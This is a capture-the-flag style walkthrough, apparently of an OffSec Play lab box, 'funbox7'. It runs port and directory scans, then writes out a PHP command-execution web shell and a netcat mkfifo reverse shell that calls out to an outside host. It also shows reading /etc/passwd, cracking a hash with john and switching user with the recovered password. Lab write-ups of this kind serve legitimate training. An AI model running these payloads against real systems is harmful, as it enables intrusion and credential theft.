```
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.187.132 -- -Pn
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.187.132:22
Open 192.168.187.132:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 02:33 EDT
Initiating Parallel DNS resolution of 1 host. at 02:33
Completed Parallel DNS resolution of 1 host. at 02:33, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:33
Scanning 192.168.187.132 [2 ports]
Discovered open port 80/tcp on 192.168.187.132
Discovered open port 22/tcp on 192.168.187.132
Completed Connect Scan at 02:33, 0.16s elapsed (2 total ports)
Nmap scan report for 192.168.187.132
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-25 02:33:03 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

```
> rustscan -u 5000 -p 22,80 -a 192.168.187.132 -- -Pn -sCV
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.187.132:22
Open 192.168.187.132:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 02:34 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 02:34
Completed Parallel DNS resolution of 1 host. at 02:34, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:34
Scanning 192.168.187.132 [2 ports]
Discovered open port 80/tcp on 192.168.187.132
Discovered open port 22/tcp on 192.168.187.132
Completed Connect Scan at 02:34, 0.16s elapsed (2 total ports)
Initiating Service scan at 02:34
Scanning 2 services on 192.168.187.132
Completed Service scan at 02:34, 6.33s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.187.132.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 4.67s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.00s elapsed
Nmap scan report for 192.168.187.132
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-25 02:34:39 EDT for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3a6aFbaxLEn4AMDXmMVZdNfaQuJQ/AcPHffagHb77o1FmSe+6tlCRHMil9l4qJILffRQHkdbQJtrlBk52V35SHfPp8x89B+Pfv7slkKxXE7fkZBIJuUjHF+YAoSakOtY72d7o6Bet2AwCijSBzZ1bkVC4i/L9euG2Oul5oA2iFlnzwYjrhki6MFNFJvvyoOqcJr1zS+w4W0NO1RexielQsxeUG3khrfVYts5kWFQPr39tk52zRZ/gpAKjR00XN4N5mi/mBjvvgnlVX4DNeyxh5r+E5sdLGzJ0Vk8JzjDW7eK70kv2KmVCFSJNceUjfaIV+K4z9wFoy6qZte7MxhaV
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoJi5En616tTVEM4UoE0AVaXFn6+Rhike29q/pKZh5nIPQfNr9jqz2II9iZ5NZCPwsjp3QrsmTdzGwqUbjMe0c=
|   256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+CVl8CiYP8L+ni0CvmpS7ywOiJU62E3O6L8G2n/Yov
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:34
Completed NSE at 02:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
```

TCP 80/HTTP
```
http://192.168.187.132
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4d9987a7-5ef0-49af-b39e-460fde0a9278)


```
> feroxbuster -u http://192.168.187.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt --no-recursion --dont-extract-links --random-agent --filter-status 404
```
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.187.132
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      375l      964w    10918c http://192.168.187.132/
301      GET        9l       28w      323c http://192.168.187.132/javascript => http://192.168.187.132/javascript/
301      GET        9l       28w      323c http://192.168.187.132/phpmyadmin => http://192.168.187.132/phpmyadmin/
[####################] - 4m     81629/81629   0s      found:3       errors:0      
[####################] - 4m     81629/81629   307/s   http://192.168.187.132/ 
```

```
http://192.168.187.132/phpmyadmin/
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/45f0f5c2-ab32-4494-bb6b-0e080a5c9926)

```
> feroxbuster -u http://192.168.187.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt --no-recursion --dont-extract-links --random-agent --filter-status 404 --extensions php
```
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.187.132
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      375l      964w    10918c http://192.168.187.132/
301      GET        9l       28w      323c http://192.168.187.132/javascript => http://192.168.187.132/javascript/
200      GET      114l      263w     3828c http://192.168.187.132/mini.php
301      GET        9l       28w      323c http://192.168.187.132/phpmyadmin => http://192.168.187.132/phpmyadmin/
[####################] - 9m     81629/81629   0s      found:4       errors:9      
[####################] - 9m     81629/81629   152/s   http://192.168.187.132/     
```

```
http://192.168.187.132/mini.php
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/2bf726fb-0cca-4591-a074-cd94dded4656)

Upload Web Shell
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/add10e6c-5c6b-4059-a264-d24521e4da30)
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/98c5648f-8d9d-4bbe-8361-315dbc58b2f5)

Netcat Reverse Shell
Execute:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.194 80 >/tmp/f
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/64422833-563a-4df4-88f3-cc1235614da4)

```
> rlwrap nc -nlvvp 80
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/0dac6902-0627-447a-8f9e-58f1299a2ee5)

Upgrade Shell
```
$ /usr/bin/script -qc /bin/bash /dev/null
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/c7127e55-a484-4e78-bb5c-a577d89d1fbf)

```
www-data@funbox7:/var/www/html$ cat /etc/passwd
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/900e0fa2-c796-4c98-a8f3-a0a3cc36e246)
```
$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0
```

Crack the hash
```
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/1e25891b-54f4-4a57-9885-9d2edf71ffa2)

Switch user to Oracle
```
www-data@funbox7:/var/www/html$ su oracle
su oracle
Password: hiphop
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/7c133ed9-197b-425d-ba10-c2dcc8ed3d9a)

